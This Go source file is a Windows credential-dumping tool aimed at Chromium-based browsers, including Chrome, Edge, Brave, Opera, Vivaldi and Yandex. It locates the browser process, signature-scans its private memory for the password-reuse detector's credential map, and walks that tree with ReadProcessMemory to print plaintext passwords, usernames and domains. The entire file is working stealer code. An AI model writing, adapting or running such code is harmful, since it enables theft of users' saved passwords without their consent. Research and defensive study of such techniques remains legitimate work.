package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type Store int

const (
	StoreNotSet   Store = 0
	StoreProfile  Store = 1 << 0
	StoreAccount  Store = 1 << 1
	StoreMaxValue Store = StoreAccount
)

type OptimizedString struct {
	Buf [23]byte
	Len uint8
}

type RemoteString struct {
	DataAddress uintptr
	StrLen      uintptr
	StrMax      int32
	Unk         [3]byte
	StrAlloc    byte
}

type MatchingReusedCredential struct {
	Left            uintptr
	Right           uintptr
	Parent          uintptr
	IsBlack         bool
	Padding         [7]byte
	Domain          OptimizedString
	GURL            [120]byte
	Username        WideOptimizedString
	CredentialStore Store
}

type VS_FIXEDFILEINFO struct {
	dwSignature        uint32
	dwStrucVersion     uint32
	dwFileVersionMS    uint32
	dwFileVersionLS    uint32
	dwProductVersionMS uint32
	dwProductVersionLS uint32
	dwFileFlagsMask    uint32
	dwFileFlags        uint32
	dwFileOS           uint32
	dwFileType         uint32
	dwFileSubtype      uint32
	dwFileDateLS       uint32
	dwFileDateMS       uint32
}

type MODULEINFO struct {
	LpBaseOfDll unsafe.Pointer
	SizeOfImage uint32
	EntryPoint  unsafe.Pointer
}

const (
	MAX_PATH = 260
)

type BrowserVersion struct {
	highMajor uint16
	lowMajor  uint16
	highMinor uint16
	lowMinor  uint16
}

const (
	MEM_COMMIT    = 0x1000
	MEM_IMAGE     = 0x1000000
	PAGE_READONLY = 0x02
	MEM_PRIVATE   = 0x00020000
)

type Node struct {
	Left         uintptr
	Right        uintptr
	Parent       uintptr
	IsBlack      bool
	Padding      [7]byte
	Key          WideOptimizedString
	ValueAddress uintptr
}

type RootNode struct {
	BeginNode windows.Handle
	FirstNode windows.Handle
	Size      uint64
}

type WideOptimizedString struct {
	Buf [11]uint16
	Unk [1]byte
	Len uint8
}

type SYSTEM_INFO struct {
	wProcessorArchitecture      uint16
	wReserved                   uint16
	dwPageSize                  uint32
	lpMinimumApplicationAddress uintptr
	lpMaximumApplicationAddress uintptr
	dwActiveProcessorMask       uintptr
	dwNumberOfProcessors        uint32
	dwProcessorType             uint32
	dwAllocationGranularity     uint32
	wProcessorLevel             uint16
	wProcessorRevision          uint16
}

var pattern = []byte{0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	verdll                 = syscall.NewLazyDLL("version.dll")
	getFileVersionInfoSize = verdll.NewProc("GetFileVersionInfoSizeW")
	getFileVersionInfo     = verdll.NewProc("GetFileVersionInfoW")
	verQueryValue          = verdll.NewProc("VerQueryValueW")
	psapiDLL               = syscall.NewLazyDLL("psapi.dll")
	enumProcessModules     = psapiDLL.NewProc("EnumProcessModulesEx")
	getModuleBaseName      = psapiDLL.NewProc("GetModuleBaseNameW")
	getModuleInfo          = psapiDLL.NewProc("GetModuleInformation")
	procGetSystemInfo      = kernel32.NewProc("GetSystemInfo")
	psapi                  = windows.NewLazySystemDLL("psapi.dll")
	getModuleFileName      = psapi.NewProc("GetModuleFileNameExW")
)

var memoryInfo windows.MemoryBasicInformation

var browsers = []string{
	"chrome.exe", "brave.exe", "chrome.exe", "opera.exe", "vivaldi.exe", "msedge.exe", "yandex.exe",
}

func main() {
	var browserVersion BrowserVersion

	for _, browser := range browsers {
		hProcess, err := FindCorrectProcessPID(browser)
		if err != nil {
			continue
		}

		if IsWow64(hProcess) {
			syscall.CloseHandle(syscall.Handle(hProcess))
			continue
		}

		GetBrowserVersion(hProcess, &browserVersion)

		dllName := "chrome.dll" // have to check if all the []browsers have this one
		var baseAddres uintptr = 0
		var moduleSize uint32 = 0

		if !GetRemoteModuleBaseAddress(hProcess, dllName, &baseAddres, &moduleSize) {
			fmt.Println("Failed to find target DLL")
			continue
		}

		fmt.Printf("Found the chrome.dll in address: 0x%X\n", baseAddres)

		var targetSection uintptr = 0
		if !FindLargestSection(hProcess, baseAddres, &targetSection) {
			fmt.Println("Something went wrong")
			continue
		}

		fmt.Printf("Found the chrome.dll in address: 0x%X\n", targetSection)

		//printByteSlice("before patching chrome.dll", pattern)

		var chromeDllPattern [unsafe.Sizeof(uintptr(0))]byte
		ConvertToByteArray(targetSection, &chromeDllPattern[0], unsafe.Sizeof(uintptr(0)))
		PatchPattern(&pattern, chromeDllPattern, 8)

		//printByteSlice("AFTER patching chrome.dll", pattern)

		PasswordReuseDetectorInstances := make([]uintptr, 100)
		var szPasswordReuseDetectorInstances uintptr = 0

		if !FindPattern(hProcess, pattern, uintptr(len(pattern)), &PasswordReuseDetectorInstances, &szPasswordReuseDetectorInstances) {
			syscall.CloseHandle(syscall.Handle(hProcess))
			fmt.Println("Failed to find pattern!")
			return
		}

		fmt.Printf("[*] Found %d instances of CredentialMap!\n", szPasswordReuseDetectorInstances)

		for _, passwordReusedInstance := range PasswordReuseDetectorInstances {
			if szPasswordReuseDetectorInstances == 0 || passwordReusedInstance == 0 {
				break
			}

			var credentialMapOffset uintptr = 0x18
			credentialMapOffset += passwordReusedInstance + unsafe.Sizeof(uintptr(0))

			WalkCredentialMap(hProcess, credentialMapOffset)
		}

		syscall.CloseHandle(syscall.Handle(hProcess))
		fmt.Println("Done")
	}
}

func FindCorrectProcessPID(processName string) (windows.Handle, error) {
	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(hSnap)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	if err := windows.Process32First(hSnap, &pe32); err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		name := windows.UTF16ToString(pe32.ExeFile[:])
		if name == processName {
			hParent, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pe32.ParentProcessID)
			if err != nil {
				windows.CloseHandle(hParent)
			} else {
				hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pe32.ProcessID)
				if err == nil {
					fmt.Printf("[+] Found %s main process PID: %d\n", processName, pe32.ProcessID)
					return hProcess, nil
				}
			}
		}
		if err := windows.Process32Next(hSnap, &pe32); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process not found")
}

func IsWow64(hProcess windows.Handle) bool {
	var isWow64 bool
	err := windows.IsWow64Process(hProcess, &isWow64)
	if err != nil {
		fmt.Println("IsWow64Process failed for browser process")
		windows.CloseHandle(hProcess)
		return true
	}
	if isWow64 {
		windows.CloseHandle(hProcess)
		return true
	}
	return false
}

func GetBrowserVersion(hProcess windows.Handle, browserVersion *BrowserVersion) bool {
	filePath := make([]uint16, MAX_PATH)
	ret, _, _ := getModuleFileName.Call(uintptr(hProcess), 0, uintptr(unsafe.Pointer(&filePath[0])), uintptr(MAX_PATH))
	if ret == 0 {
		fmt.Println("GetModuleFileNameEx failed")
		return false
	}

	norunas := syscall.UTF16ToString(filePath)
	fmt.Println("Path:", norunas)

	var dwHandle uint32
	dwSize, _, err := getFileVersionInfoSize.Call(uintptr(unsafe.Pointer(&filePath[0])), uintptr(unsafe.Pointer(&dwHandle)))
	if dwSize == 0 && err != nil {
		fmt.Println("GetFileVersionInfoSize failed")
		return false
	}

	buffer := make([]byte, dwSize)
	ret, _, _ = getFileVersionInfo.Call(uintptr(unsafe.Pointer(&filePath[0])), 0, uintptr(dwSize), uintptr(unsafe.Pointer(&buffer[0])))
	if ret == 0 {
		fmt.Println("GetFileVersionInfo failed")
		return false
	}

	var fileInfo *VS_FIXEDFILEINFO
	var len uint32
	ret, _, _ = verQueryValue.Call(uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("\\"))), uintptr(unsafe.Pointer(&fileInfo)), uintptr(unsafe.Pointer(&len)))
	if ret == 0 || len == 0 {
		fmt.Println("VerQueryValue failed or returned empty VS_FIXEDFILEINFO")
		return false
	}

	fmt.Printf("[*] Browser Version: %d.%d.%d.%d\n\n",
		HiWord(fileInfo.dwProductVersionMS),
		LoWord(fileInfo.dwProductVersionMS),
		HiWord(fileInfo.dwProductVersionLS),
		LoWord(fileInfo.dwProductVersionLS),
	)

	browserVersion.highMajor = HiWord(fileInfo.dwProductVersionMS)
	browserVersion.lowMajor = LoWord(fileInfo.dwProductVersionMS)
	browserVersion.highMinor = HiWord(fileInfo.dwProductVersionLS)
	browserVersion.lowMinor = LoWord(fileInfo.dwProductVersionLS)

	return true
}

func HiWord(dw uint32) uint16 {
	return uint16(dw >> 16)
}

func LoWord(dw uint32) uint16 {
	return uint16(dw & 0xFFFF)
}

func GetRemoteModuleBaseAddress(hProcess windows.Handle, moduleName string, baseAddress *uintptr, moduleSize *uint32) bool {
	szModules := 1024 * unsafe.Sizeof(windows.Handle(0))
	hModules := make([]windows.Handle, 1024)
	var cbNeeded uint32

	ret, _, _ := enumProcessModules.Call(uintptr(hProcess), uintptr(unsafe.Pointer(&hModules[0])), uintptr(szModules), uintptr(unsafe.Pointer(&cbNeeded)), uintptr(0x03)) // LIST_MODULES_ALL is 0x03
	if ret == 0 {
		fmt.Println("EnumProcessModulesEx failed")
		return false
	}

	numModules := int(cbNeeded) / int(unsafe.Sizeof(windows.Handle(0)))
	for i := range numModules {
		var szModuleName [MAX_PATH]uint16

		ret, _, _ := getModuleBaseName.Call(uintptr(hProcess), uintptr(hModules[i]), uintptr(unsafe.Pointer(&szModuleName[0])), uintptr(MAX_PATH))
		if ret == 0 {
			fmt.Println("GetModuleBaseName failed")
			continue
		}

		if syscall.UTF16ToString(szModuleName[:]) == moduleName {
			var moduleInfo MODULEINFO

			ret, _, _ := getModuleInfo.Call(uintptr(hProcess), uintptr(hModules[i]), uintptr(unsafe.Pointer(&moduleInfo)), uintptr(unsafe.Sizeof(moduleInfo)))
			if ret == 0 {
				fmt.Println("GetModuleInformation failed")
				return false
			}

			*baseAddress = uintptr(unsafe.Pointer(moduleInfo.LpBaseOfDll))
			*moduleSize = moduleInfo.SizeOfImage
			return true
		}
	}

	return false
}

func FindLargestSection(hProcess windows.Handle, moduleAddr uintptr, resultAddress *uintptr) bool {
	var memoryInfo windows.MemoryBasicInformation
	offset := moduleAddr
	largestRegion := uintptr(0)

	for {
		err := windows.VirtualQueryEx(
			hProcess,
			uintptr(offset),
			&memoryInfo,
			uintptr(unsafe.Sizeof(memoryInfo)),
		)

		if err != nil {
			break
		}

		if memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect&PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE {
			if memoryInfo.RegionSize > largestRegion {
				largestRegion = memoryInfo.RegionSize
				*resultAddress = memoryInfo.BaseAddress
			}
		}

		offset += uintptr(memoryInfo.RegionSize)
	}

	return largestRegion > 0
}

func ConvertToByteArray(value uintptr, byteArray *byte, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(byteArray)) + i)) = byte(value & 0xFF)
		value >>= 8
	}
}

func PatchBaseAddress(pattern []byte, patternSize uintptr, baseAddress uintptr) []byte {
	newPattern := make([]byte, patternSize)
	copy(newPattern, pattern)

	var baseAddrPattern [unsafe.Sizeof(uintptr(0))]byte
	ConvertToByteArray(baseAddress, &baseAddrPattern[0], unsafe.Sizeof(uintptr(0)))

	PatchPattern(&newPattern, baseAddrPattern, 40)
	PatchPattern(&newPattern, baseAddrPattern, 48)

	return newPattern
}

func PatchPattern(pattern *[]byte, baseAddrPattern [unsafe.Sizeof(uintptr(0))]byte, offset int) {
	szAddr := len(baseAddrPattern) - 1

	for offset--; szAddr > 3; offset-- {
		if offset >= 0 && szAddr >= 0 {
			(*pattern)[offset] = baseAddrPattern[szAddr]
		}
		szAddr--
	}
}

func GetSystemInfo(sysInfo *SYSTEM_INFO) {
	procGetSystemInfo.Call(uintptr(unsafe.Pointer(sysInfo)))
}

func FindPattern(hProcess windows.Handle, pattern []byte, patternSize uintptr, passwordReuseDetectorInstances *[]uintptr, szPasswordReuseDetectorInstances *uintptr) bool {
	var systemInfo SYSTEM_INFO
	GetSystemInfo(&systemInfo)

	startAddress := uintptr(systemInfo.lpMinimumApplicationAddress)
	endAddress := uintptr(systemInfo.lpMaximumApplicationAddress)

	fmt.Printf("StartAddress:0x%X\n", startAddress)
	fmt.Printf("StartAddress:0x%X\n", endAddress)

	for startAddress < endAddress {
		err := windows.VirtualQueryEx(hProcess, startAddress, &memoryInfo, uintptr(unsafe.Sizeof(memoryInfo)))

		if err == nil {
			if memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect&windows.PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE {
				buffer := make([]byte, memoryInfo.RegionSize)
				bufferPtr := (*byte)(unsafe.Pointer(&buffer[0]))

				newPattern := PatchBaseAddress(pattern, patternSize, memoryInfo.BaseAddress)

				var bytesRead uintptr

				if err := windows.ReadProcessMemory(hProcess, memoryInfo.BaseAddress, bufferPtr, memoryInfo.RegionSize, &bytesRead); err == nil {
					for i := uintptr(0); i <= bytesRead-patternSize; i++ {
						bufferPtr := unsafe.Pointer(uintptr(unsafe.Pointer(bufferPtr)) + i)
						patternPtr := unsafe.Pointer(&newPattern[0])

						if MyMemCmp(bufferPtr, patternPtr, patternSize, i) {
							resultAddress := uintptr(memoryInfo.BaseAddress) + i

							if szPasswordReuseDetectorInstances != nil && *szPasswordReuseDetectorInstances >= 100 {
								return true
							}

							(*passwordReuseDetectorInstances)[*szPasswordReuseDetectorInstances] = resultAddress
							*szPasswordReuseDetectorInstances += 1
						}
					}
				} else {
					fmt.Println("ReadProcessMemory failed")
				}
			}

			startAddress += uintptr(memoryInfo.RegionSize)
		} else {
			fmt.Println("VirtualQueryEx failed")
			break
		}
	}

	return *szPasswordReuseDetectorInstances > 0
}

func MyMemCmp(source unsafe.Pointer, searchPattern unsafe.Pointer, num uintptr, aux uintptr) bool {
	for i := uintptr(0); i < num; i++ {
		patternByte := *(*byte)(unsafe.Pointer(uintptr(searchPattern) + i))
		if patternByte == 0xAA {
			continue
		}

		sourceByte := *(*byte)(unsafe.Pointer(uintptr(source) + i))
		if sourceByte != patternByte {
			return false
		}
	}
	return true
}

func ProcessNode(hProcess windows.Handle, node Node) {
	fmt.Println("Credential entry:")
	fmt.Print("    Password: ")
	ReadWideString(hProcess, node.Key)

	fmt.Printf("Attempting to read credential values from address: 0x%p\n",
		unsafe.Pointer(uintptr(node.ValueAddress)))

	ProcessNodeValue(hProcess, node.ValueAddress)

	if node.Left != 0 {
		var leftNode Node
		var bytesRead uintptr

		if err := windows.ReadProcessMemory(
			hProcess,
			uintptr(node.Left),
			(*byte)(unsafe.Pointer(&leftNode)),
			unsafe.Sizeof(Node{}),
			&bytesRead); err == nil {

			ProcessNode(hProcess, leftNode)
		} else {
			fmt.Println("Error reading left node")
		}
	}

	if node.Right != 0 {
		var rightNode Node
		var bytesRead uintptr

		if err := windows.ReadProcessMemory(
			hProcess,
			uintptr(node.Right),
			(*byte)(unsafe.Pointer(&rightNode)),
			unsafe.Sizeof(Node{}),
			&bytesRead); err == nil {

			ProcessNode(hProcess, rightNode)
		} else {
			fmt.Println("Error reading right node")
		}
	}
}

func ProcessNodeValue(hProcess windows.Handle, valueAddr uintptr) {
	var creds MatchingReusedCredential
	var bytesRead uintptr

	if err := windows.ReadProcessMemory(
		hProcess,
		valueAddr,
		(*byte)(unsafe.Pointer(&creds)),
		unsafe.Sizeof(MatchingReusedCredential{}),
		&bytesRead); err != nil {

		fmt.Println("Failed to read credential struct")
		return
	}

	PrintValues(creds, hProcess)
}

func PrintValues(creds MatchingReusedCredential, hProcess windows.Handle) {
	fmt.Print("    Name: ")
	ReadWideString(hProcess, creds.Username)

	fmt.Print("    Domain: ")
	ReadString(hProcess, creds.Domain)

	fmt.Print("    CredentialStore: ")
	switch creds.CredentialStore {
	case StoreNotSet:
		fmt.Println("NotSet")
	case StoreAccount:
		fmt.Println("AccountStore")
	case StoreProfile:
		fmt.Println("ProfileStore")
	default:
		fmt.Println("Error!")
	}

	fmt.Println("")
}

func WalkCredentialMap(hProcess windows.Handle, credentialMapAddress uintptr) {
	var credentialMap RootNode
	var bytesRead uintptr

	if err := windows.ReadProcessMemory(
		hProcess,
		credentialMapAddress,
		(*byte)(unsafe.Pointer(&credentialMap)),
		unsafe.Sizeof(RootNode{}),
		&bytesRead); err != nil {

		fmt.Println("Failed to read the root node from given address")
		return
	}

	fmt.Printf("Address of beginNode: 0x%p\n", &credentialMap.BeginNode)
	fmt.Printf("Address of firstNode: 0x%p\n", &credentialMap.FirstNode)
	fmt.Printf("Size of the credential map: %d\n", credentialMap.Size)

	fmt.Printf("[*] Number of available credentials: %d\n\n", credentialMap.Size)

	if credentialMap.FirstNode == 0 {
		fmt.Println("[*] This credential map was empty")
		return
	}

	var firstNode Node

	if err := windows.ReadProcessMemory(
		hProcess,
		uintptr(credentialMap.FirstNode),
		(*byte)(unsafe.Pointer(&firstNode)),
		unsafe.Sizeof(Node{}),
		&bytesRead); err == nil {

		ProcessNode(hProcess, firstNode)
	} else {
		fmt.Println("Error reading first node")
	}
}
func ReadWideString(hProcess windows.Handle, str WideOptimizedString) {
	if str.Len > 11 {
		var longString RemoteString
		copy((*[unsafe.Sizeof(RemoteString{})]byte)(unsafe.Pointer(&longString))[:],
			(*[unsafe.Sizeof(RemoteString{})]byte)(unsafe.Pointer(&str.Buf[0]))[:])

		if longString.DataAddress != 0 {
			buf := make([]uint16, longString.StrMax+1)
			var bytesRead uintptr

			if err := windows.ReadProcessMemory(
				hProcess,
				longString.DataAddress,
				(*byte)(unsafe.Pointer(&buf[0])),
				uintptr((longString.StrLen+1)*2),
				&bytesRead); err != nil {

				fmt.Println("Failed to read credential value:", err)
				return
			}

			fmt.Println(syscall.UTF16ToString(buf[:longString.StrLen]))
		}
	} else {
		fmt.Println(syscall.UTF16ToString(str.Buf[:str.Len]))
	}
}

func ReadString(hProcess windows.Handle, str OptimizedString) {
	if str.Len > 23 {
		var longString RemoteString
		copy((*[unsafe.Sizeof(RemoteString{})]byte)(unsafe.Pointer(&longString))[:],
			(*[unsafe.Sizeof(RemoteString{})]byte)(unsafe.Pointer(&str.Buf[0]))[:])

		if longString.DataAddress != 0 {
			fmt.Printf("Attempting to read the credential value from address: 0x%p\n",
				unsafe.Pointer(uintptr(longString.DataAddress)))

			buf := make([]byte, longString.StrMax)

			var bytesRead uintptr
			baseAddress := uintptr(longString.DataAddress)

			if err := windows.ReadProcessMemory(
				hProcess,
				baseAddress,
				(*byte)(unsafe.Pointer(&buf[0])),
				uintptr(longString.StrLen+1),
				&bytesRead); err != nil {

				fmt.Println("Failed to read credential value:", err)
				return
			}

			fmt.Println(string(buf[:longString.StrLen]))
		}
	} else {
		fmt.Println(string(str.Buf[:str.Len]))
	}
}

func printByteSlice(label string, data []byte) {
	fmt.Println(label)
	fmt.Print("[]byte{")
	for i, b := range data {
		fmt.Printf("0x%02X", b)
		if i < len(data)-1 {
			fmt.Print(", ")
		}
	}
	fmt.Println("}")
}
